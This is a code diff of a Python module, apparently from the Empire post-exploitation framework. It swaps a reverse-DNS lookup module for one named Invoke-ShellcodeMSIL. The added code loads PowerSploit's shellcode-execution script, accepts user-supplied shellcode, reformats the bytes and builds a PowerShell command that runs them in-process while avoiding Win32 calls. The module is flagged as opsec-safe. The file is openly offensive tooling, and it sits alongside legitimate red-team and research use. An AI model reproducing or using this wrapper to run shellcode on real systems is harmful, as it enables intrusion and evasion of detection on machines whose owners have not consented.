@@ -1,29 +1,34 @@
+import re
 from lib.common import helpers
-import os
 
 class Module:
 
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-ReverseDNSLookup',
+            'Name': 'Invoke-ShellcodeMSIL',
 
-            'Author': ['DarkOperator'],
+            'Author': ['@mattifestation'],
 
-            'Description': ('Performs a DNS Reverse Lookup of a given IPv4 IP Range.'),
+            'Description': ('Execute shellcode within the context of the running PowerShell '
+                            'process without making any Win32 function calls. Warning: This script has '
+                            'no way to validate that your shellcode is 32 vs. 64-bit!'
+                            'Note: Your shellcode must end in a ret (0xC3) and maintain proper stack '
+                            'alignment or PowerShell will crash!'),
 
-            'Background' : True,
+            'Background' : False,
 
             'OutputExtension' : None,
             
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
             
             'Comments': [
-                'https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1'
+                'http://www.exploit-monday.com',
+                'https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-ShellcodeMSIL.ps1'
             ]
         }
 
@@ -36,14 +41,9 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Range' : {
-                'Description'   :   "Range to perform reverse DNS on.",
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'CIDR' : {
-                'Description'   :   "CIDR to perform reverse DNS on.",
-                'Required'      :   False,
+            'Shellcode' : {
+                'Description'   :   'Shellcode to inject, 0x00,0x0a,... format.',
+                'Required'      :   True,
                 'Value'         :   ''
             }
         }
@@ -51,7 +51,7 @@ class Module:
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
-
+        
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -60,9 +60,9 @@ class Module:
 
 
     def generate(self):
-
+        
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/Invoke-ReverseDNSLookup.ps1".replace('/', os.sep)
+        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ShellcodeMSIL.ps1".replace('/', os.sep)
 
         try:
             f = open(moduleSource, 'r')
@@ -75,18 +75,14 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-ReverseDNSLookup"
+        script += "Invoke-ShellcodeMSIL"
 
         for option,values in self.options.iteritems():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
-        # only return objects where HostName is not an IP (i.e. the address resolves)
-        script += " | % {try{$entry=$_; $ipObj = [System.Net.IPAddress]::parse($entry.HostName); if(-not [System.Net.IPAddress]::tryparse([string]$_.HostName, [ref]$ipObj)) { $entry }} catch{$entry} } | Select-Object HostName, AddressList | ft -autosize | Out-String | %{$_ + \"`n\"}"
-
+                    if option.lower() == "shellcode":
+                        # transform the shellcode to the correct format
+                        sc = ",0".join(values['Value'].split("\\"))[1:]
+                        script += " -" + str(option) + " @(" + sc + ")"
+        
         return script
